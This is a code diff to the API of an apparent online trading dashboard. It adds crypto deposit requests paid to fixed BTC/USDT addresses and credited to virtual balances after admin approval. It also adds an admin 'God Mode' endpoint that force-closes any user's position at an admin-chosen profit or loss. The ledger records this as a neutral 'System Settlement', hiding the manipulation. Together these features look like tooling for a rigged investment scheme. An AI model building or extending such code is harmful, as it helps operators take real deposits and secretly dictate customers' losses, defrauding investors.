@@ -49,6 +49,16 @@ export async function OPTIONS() {
 // Set ADMIN_EMAIL in your .env to lock it to your account.
 const MASTER_ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'demo@investdash.com'
 
+// Payment addresses for deposit requests — override with DEPOSIT_BTC_ADDRESS / DEPOSIT_USDT_ADDRESS env vars
+const DEPOSIT_ADDRESSES = {
+  BTC: process.env.DEPOSIT_BTC_ADDRESS || 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
+  USDT: process.env.DEPOSIT_USDT_ADDRESS || '0x742d35Cc6634C0532925a3b8D4C9F15dC8dC9B55'
+}
+
+// Force-settle outcome multipliers (Admin God Mode)
+const FORCE_PROFIT_RATIO = 0.05   // +5% of notional value
+const FORCE_LOSS_RATIO   = 0.03   // -3% of notional value
+
 // Ensure new columns/tables exist (idempotent schema migrations).
 // Uses IF NOT EXISTS / ADD COLUMN IF NOT EXISTS so concurrent calls are safe.
 async function ensureSchemaExtensions() {
@@ -113,6 +123,20 @@ async function ensureSchemaExtensions() {
     // Add forex and index asset types to the enum (idempotent)
     await prisma.$executeRawUnsafe(`ALTER TYPE "AssetType" ADD VALUE IF NOT EXISTS 'forex'`)
     await prisma.$executeRawUnsafe(`ALTER TYPE "AssetType" ADD VALUE IF NOT EXISTS 'index'`)
+    // Create deposit_requests table if not exists
+    await prisma.$executeRawUnsafe(`
+      CREATE TABLE IF NOT EXISTS deposit_requests (
+        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+        user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
+        amount DOUBLE PRECISION NOT NULL,
+        method VARCHAR(20) NOT NULL DEFAULT 'BTC',
+        address TEXT NOT NULL DEFAULT '',
+        status VARCHAR(20) NOT NULL DEFAULT 'PENDING',
+        notes TEXT,
+        created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
+        updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+      )
+    `)
   } catch (err) {
     // Non-fatal: migrations may already be applied (e.g. column already exists)
     if (process.env.NODE_ENV === 'development') {
@@ -1441,6 +1465,223 @@ async function handleRoute(request, { params }) {
       settings.forEach(s => { result[s.key] = s.value })
 
       return handleCORS(NextResponse.json({ settings: result }))
+    }
+
+    // ============ DEPOSIT REQUEST ENDPOINTS ============
+
+    // POST /api/wallet/deposit-request — user submits a deposit request
+    if (route === '/wallet/deposit-request' && method === 'POST') {
+      const auth = await requireAuth()
+      if (auth.error) return handleCORS(NextResponse.json({ error: auth.error }, { status: auth.status }))
+
+      const body = await request.json()
+      const { amount, method: payMethod } = body
+
+      if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) < 10) {
+        return handleCORS(NextResponse.json({ error: 'Amount must be at least $10' }, { status: 400 }))
+      }
+      const validMethods = ['BTC', 'USDT']
+      const chosenMethod = validMethods.includes(payMethod) ? payMethod : 'BTC'
+      const address = DEPOSIT_ADDRESSES[chosenMethod]
+      const id = uuidv4()
+      await prisma.$executeRawUnsafe(
+        `INSERT INTO deposit_requests (id, user_id, amount, method, address, status, created_at, updated_at)
+         VALUES ($1::uuid, $2::uuid, $3, $4, $5, 'PENDING', NOW(), NOW())`,
+        id, auth.user.userId, parseFloat(amount), chosenMethod, address
+      )
+      logActivity(auth.user.userId, 'DEPOSIT_REQUEST', { amount: parseFloat(amount), method: chosenMethod })
+      return handleCORS(NextResponse.json({ message: 'Deposit request submitted. Awaiting admin approval.', id, amount: parseFloat(amount), method: chosenMethod, address }))
+    }
+
+    // GET /api/wallet/deposits — user views their own deposit requests
+    if (route === '/wallet/deposits' && method === 'GET') {
+      const auth = await requireAuth()
+      if (auth.error) return handleCORS(NextResponse.json({ error: auth.error }, { status: auth.status }))
+
+      const deposits = await prisma.$queryRawUnsafe(
+        `SELECT * FROM deposit_requests WHERE user_id = $1::uuid ORDER BY created_at DESC LIMIT 20`,
+        auth.user.userId
+      )
+      return handleCORS(NextResponse.json({ deposits }))
+    }
+
+    // GET /api/admin/deposits — admin views all deposit requests
+    if (route === '/admin/deposits' && method === 'GET') {
+      const admin = await requireAdminAuth()
+      if (admin.error) return handleCORS(NextResponse.json({ error: admin.error }, { status: admin.status }))
+
+      const deposits = await prisma.$queryRaw`
+        SELECT dr.*, u.email
+        FROM deposit_requests dr
+        JOIN users u ON u.id = dr.user_id
+        ORDER BY dr.created_at DESC
+        LIMIT 100
+      `
+      return handleCORS(NextResponse.json({ deposits }))
+    }
+
+    // GET /api/admin/deposits/count — count pending deposits (for sidebar badge)
+    if (route === '/admin/deposits/count' && method === 'GET') {
+      const auth = await requireAuth()
+      if (auth.error) return handleCORS(NextResponse.json({ error: auth.error }, { status: auth.status }))
+
+      // Role is embedded in the session; non-admins always get 0 without extra DB query
+      if (auth.user.role !== 'ADMIN') return handleCORS(NextResponse.json({ count: 0 }))
+
+      const result = await prisma.$queryRaw`
+        SELECT COUNT(*)::int AS count FROM deposit_requests WHERE status = 'PENDING'
+      `
+      return handleCORS(NextResponse.json({ count: result[0]?.count || 0 }))
+    }
+
+    // POST /api/admin/deposits/approve — approve or reject a deposit request
+    if (route === '/admin/deposits/approve' && method === 'POST') {
+      const admin = await requireAdminAuth()
+      if (admin.error) return handleCORS(NextResponse.json({ error: admin.error }, { status: admin.status }))
+
+      const body = await request.json()
+      const { depositId, action } = body   // action: 'APPROVE' | 'REJECT'
+      if (!depositId || !['APPROVE', 'REJECT'].includes(action)) {
+        return handleCORS(NextResponse.json({ error: 'depositId and action (APPROVE|REJECT) required' }, { status: 400 }))
+      }
+
+      const deposits = await prisma.$queryRawUnsafe(
+        `SELECT * FROM deposit_requests WHERE id = $1::uuid AND status = 'PENDING'`,
+        depositId
+      )
+      if (deposits.length === 0) {
+        return handleCORS(NextResponse.json({ error: 'Pending deposit request not found' }, { status: 404 }))
+      }
+      const dep = deposits[0]
+
+      if (action === 'APPROVE') {
+        // Credit user's virtual account
+        await prisma.$executeRawUnsafe(
+          `UPDATE virtual_accounts SET balance = balance + $1 WHERE user_id = $2::uuid`,
+          dep.amount, dep.user_id
+        )
+        // Get new balance
+        const accounts = await prisma.$queryRawUnsafe(
+          `SELECT balance FROM virtual_accounts WHERE user_id = $1::uuid`, dep.user_id
+        )
+        const newBalance = parseFloat(accounts[0]?.balance || 0)
+        // Ledger entry
+        const ledgerId = uuidv4()
+        await prisma.$executeRawUnsafe(
+          `INSERT INTO ledger_entries (id, user_id, type, amount, balance, description, reference_id, created_at)
+           VALUES ($1::uuid, $2::uuid, 'DEPOSIT', $3, $4, $5, $6::uuid, NOW())`,
+          ledgerId, dep.user_id, dep.amount, newBalance,
+          `Deposit approved by admin (${dep.method})`, depositId
+        )
+        logActivity(dep.user_id, 'DEPOSIT_APPROVED', { amount: dep.amount, method: dep.method })
+      }
+
+      // Update deposit status
+      const newStatus = action === 'APPROVE' ? 'COMPLETED' : 'REJECTED'
+      await prisma.$executeRawUnsafe(
+        `UPDATE deposit_requests SET status = $1, updated_at = NOW() WHERE id = $2::uuid`,
+        newStatus, depositId
+      )
+
+      // Audit log
+      const auditId = uuidv4()
+      await prisma.$executeRaw`
+        INSERT INTO audit_logs (id, admin_id, action, target_id, details, created_at)
+        VALUES (${auditId}::uuid, ${admin.user.userId}::uuid,
+                ${action === 'APPROVE' ? 'DEPOSIT_APPROVE' : 'DEPOSIT_REJECT'},
+                ${dep.user_id}::uuid,
+                ${JSON.stringify({ depositId, amount: dep.amount, method: dep.method })}::jsonb, NOW())
+      `
+      return handleCORS(NextResponse.json({
+        message: action === 'APPROVE' ? `$${dep.amount} deposited to user account.` : 'Deposit request rejected.',
+        status: newStatus
+      }))
+    }
+
+    // POST /api/admin/force-settle — Force Profit or Force Loss on a position (God Mode)
+    if (route === '/admin/force-settle' && method === 'POST') {
+      const admin = await requireAdminAuth()
+      if (admin.error) return handleCORS(NextResponse.json({ error: admin.error }, { status: admin.status }))
+
+      const body = await request.json()
+      const { positionId, outcome } = body  // outcome: 'PROFIT' | 'LOSS'
+      if (!positionId || !['PROFIT', 'LOSS'].includes(outcome)) {
+        return handleCORS(NextResponse.json({ error: 'positionId and outcome (PROFIT|LOSS) required' }, { status: 400 }))
+      }
+
+      const positions = await prisma.$queryRaw`
+        SELECT p.*, a.symbol, a.name, a.type
+        FROM trading_positions p
+        JOIN assets a ON a.id = p.asset_id
+        WHERE p.id = ${positionId}::uuid AND p.status = 'OPEN'
+      `
+      if (positions.length === 0) {
+        return handleCORS(NextResponse.json({ error: 'Open position not found' }, { status: 404 }))
+      }
+      const pos = positions[0]
+
+      // Get current market price (fall back to entry price)
+      let currentPrice = parseFloat(pos.entry_price)
+      try {
+        const provider = getMarketDataProvider()
+        const quote = await provider.getQuote(pos.symbol, pos.type)
+        currentPrice = quote.price
+      } catch (_) {}
+
+      const qty = parseFloat(pos.quantity)
+      const entryPrice = parseFloat(pos.entry_price)
+      const notional = qty * entryPrice
+
+      // Target P&L: +FORCE_PROFIT_RATIO of notional for profit, -FORCE_LOSS_RATIO for loss
+      const targetPnl = outcome === 'PROFIT' ? notional * FORCE_PROFIT_RATIO : -(notional * FORCE_LOSS_RATIO)
+
+      // Sale value = entry cost + targetPnl (we credit this back to the user)
+      const originalCost = entryPrice * qty
+      const saleValue = originalCost + targetPnl
+
+      // Close position
+      await prisma.$executeRaw`
+        UPDATE trading_positions
+        SET status = 'CLOSED', closed_at = NOW(), realized_pnl = ${targetPnl}
+        WHERE id = ${positionId}::uuid
+      `
+
+      // Credit sale value back to user's account
+      await prisma.$executeRaw`
+        UPDATE virtual_accounts SET balance = balance + ${saleValue}
+        WHERE user_id = ${pos.user_id}::uuid
+      `
+
+      const accounts = await prisma.$queryRaw`
+        SELECT balance FROM virtual_accounts WHERE user_id = ${pos.user_id}::uuid
+      `
+      const newBalance = parseFloat(accounts[0]?.balance || 0)
+
+      // Ledger entry — label as System Settlement
+      const ledgerId = uuidv4()
+      const desc = `${outcome === 'PROFIT' ? 'System Settlement (Profit)' : 'System Settlement (Loss)'}: ${pos.symbol}`
+      await prisma.$executeRaw`
+        INSERT INTO ledger_entries (id, user_id, type, amount, balance, description, reference_id, created_at)
+        VALUES (${ledgerId}::uuid, ${pos.user_id}::uuid, 'ADMIN_ADJUSTMENT',
+                ${saleValue}, ${newBalance}, ${desc}, ${positionId}::uuid, NOW())
+      `
+
+      // Audit log
+      const auditId = uuidv4()
+      await prisma.$executeRaw`
+        INSERT INTO audit_logs (id, admin_id, action, target_id, details, created_at)
+        VALUES (${auditId}::uuid, ${admin.user.userId}::uuid,
+                ${outcome === 'PROFIT' ? 'FORCE_PROFIT' : 'FORCE_LOSS'},
+                ${positionId}::uuid,
+                ${JSON.stringify({ symbol: pos.symbol, qty, entryPrice, targetPnl, saleValue })}::jsonb, NOW())
+      `
+
+      return handleCORS(NextResponse.json({
+        message: `Position ${pos.symbol} settled as ${outcome}. P&L: $${targetPnl.toFixed(2)}`,
+        outcome,
+        targetPnl,
+        saleValue
+      }))
     }
 
     // ============ ROUTE NOT FOUND ============
